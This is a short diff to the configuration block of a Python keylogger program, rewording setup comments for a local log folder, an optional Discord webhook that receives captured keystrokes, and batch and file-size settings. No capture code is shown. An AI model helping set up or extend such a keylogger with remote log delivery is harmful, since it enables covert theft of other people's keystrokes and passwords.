@@ -334,23 +334,22 @@ class Keylogger:
 
 def main() -> None:
     # =========================================================================
-    # ⚙️ USER CONFIGURATION
+    # ⚙️ EASY CONFIGURATION (EDIT HERE)
     # =========================================================================
     
-    # 1. WHERE TO SAVE LOGS
-    # Replace 'Path.home() / "logs"' with your custom path if needed.
-    # Example: Path(r"E:\KeyLogger\Logs")
-    LOG_PATH = Path(r"Your_Path") 
+    # [STEP 1] Where should the log files be saved?
+    # INSTRUCTION: Paste your folder path inside the quotes. Keep the 'r' at the start.
+    # Example: Path(r"C:\Users\Dev\Desktop\Logs")
+    LOG_PATH = Path(r"E:\KeyLogger\Logs") 
 
-    # 2. REMOTE LOGGING (OPTIONAL)
-    # Paste your Discord Webhook URL inside the quotes below.
-    # Leave as None to disable remote logging.
+    # [STEP 2] Do you want to send logs to Discord?
+    # YES: Paste your "https://..." Webhook URL inside the quotes.
+    # NO:  Set the value to None (no quotes).
     DISCORD_WEBHOOK_URL = None 
-    # Example: "https://discord.com/api/webhooks/12345/abcdefg..."
 
-    # 3. SETTINGS
-    BATCH_SIZE = 50   # Number of keys to collect before sending to Discord
-    MAX_FILE_SIZE = 5.0 # Max size of local log file in MB
+    # [STEP 3] Tuning
+    BATCH_SIZE = 50       # How many keys to collect before sending a message to Discord?
+    MAX_FILE_SIZE = 5.0   # Start a new log file if the current one gets bigger than 5MB.
 
     # =========================================================================
 
